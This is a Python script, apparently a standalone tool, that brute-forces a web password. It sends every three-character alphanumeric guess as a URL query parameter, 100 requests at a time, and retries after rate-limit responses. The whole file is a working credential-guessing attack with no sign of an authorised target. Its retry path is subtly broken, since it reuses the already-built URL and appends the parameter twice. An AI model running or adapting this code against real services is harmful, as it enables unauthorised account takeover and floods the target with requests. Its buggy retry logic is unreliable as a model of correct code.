import asyncio
import string
import time
import aiohttp
from logger import logger
from itertools import product
from env import get_url


CONCURRENT_ATTEMPTS = 100
STATUS_INTERVAL = 1000  # Log status every 1000 requests
RETRY_DELAY = 5  # Delay in seconds before retrying a password

async def try_password(session, url, password, retries=3):
    full_url = f"{url}?password={password}"
    try:
        async with session.get(full_url) as response:
            text = await response.text()
            if "invalid password" not in text.lower() :  # Check if the response text indicates a success
                logger.critical(f"Password successful: {password}, Response: {text}")
                return password, response.status, True
            elif response.status == 429 and retries > 0:  # Handle rate limiting
                logger.debug(f"Rate limit hit with password: {password}, retrying in {RETRY_DELAY} seconds...")
                await asyncio.sleep(RETRY_DELAY)
                return await try_password(session, full_url, password, retries - 1)
            elif response.status not in [401, 429]:  # Log unusual status codes
                logger.info(f"Unusual response for password: {password}, Status: {response.status}, Response: {text}")
            return password, response.status, False
    except asyncio.TimeoutError:
        logger.debug(f"Timeout with password: {password}")
        return password, None, False

def generate_passwords(characters, length):
    """Generates all combinations of given characters up to the specified length."""
    for combination in product(characters, repeat=length):
        yield ''.join(combination)

async def brute_force_password(session, url, passwords):
    tasks = []
    total_requests = 0
    successful_attempts = 0
    failed_attempts = 0
    for password in passwords:
        tasks.append(try_password(session, url, password))
        if len(tasks) >= CONCURRENT_ATTEMPTS:
            results = await asyncio.gather(*tasks)
            for password, status, success in results:
                total_requests += 1
                if success:
                    successful_attempts += 1
                else:
                    failed_attempts += 1
                if total_requests % STATUS_INTERVAL == 0:
                    logger.info(f"Status Update - Total Requests: {total_requests}, Successful: {successful_attempts}, Failed: {failed_attempts}")
            tasks = []  # Reset tasks once done
    if tasks:
        results = await asyncio.gather(*tasks)
        for password, status, success in results:
            total_requests += 1
            if success:
                successful_attempts += 1
            else:
                failed_attempts += 1
    return total_requests, successful_attempts, failed_attempts

async def main():
    url = get_url()
    characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
    length = 3
    all_passwords = generate_passwords(characters, length)
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        total_requests, successful_attempts, failed_attempts = await brute_force_password(session, url, all_passwords)
        time_elapsed = time.time() - start_time
        logger.critical(f"Total requests: {total_requests}")
        logger.critical(f"Successful attempts: {successful_attempts}")
        logger.critical(f"Failed attempts: {failed_attempts}")
        logger.critical(f"Time taken: {time_elapsed:.2f} seconds")

if __name__ == '__main__':
    asyncio.run(main())
